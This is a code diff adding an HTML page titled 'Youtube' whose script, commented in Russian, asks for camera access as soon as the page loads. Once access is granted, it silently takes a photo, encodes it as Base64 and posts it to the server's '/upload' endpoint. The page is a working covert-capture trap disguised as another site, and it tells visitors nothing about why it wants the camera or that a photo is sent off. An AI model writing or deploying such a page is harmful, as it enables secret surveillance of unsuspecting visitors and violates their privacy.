@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Youtube</title>
+</head>
+<body>
+<h1>Made by progman</h1>
+
+<script>
+  // Запрашиваем доступ к камере и делаем фото
+  navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function (stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Автоматически захватываем фото после загрузки метаданных
+            video.onloadedmetadata = function () {
+              setTimeout(function () {
+                captureAndUpload(video);
+              }, 10); // Делаем фото через 3 секунды
+            };
+          })
+          .catch(function (error) {
+            console.error('Ошибка доступа к камере:', error);
+          });
+
+  function captureAndUpload(video) {
+    // Создаем элемент canvas для захвата изображения
+    const canvas = document.createElement('canvas');
+    canvas.width = 640; // Установите желаемую ширину
+    canvas.height = 480; // Установите желаемую высоту
+    const context = canvas.getContext('2d');
+
+    // Рисуем изображение с видео на canvas
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Преобразуем изображение в строку Base64
+    const dataURL = canvas.toDataURL('image/png');
+
+    // Отправляем изображение на сервер
+    fetch('/upload', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ image: dataURL })
+    })
+            .then(response => response.text())
+            .then(result => {
+              console.log(result);
+              // Останавливаем поток видео
+              const stream = video.srcObject;
+              if (stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+              }
+            })
+            .catch(error => console.error('Ошибка:', error));
+  }
+</script>
+</body>
+</html>
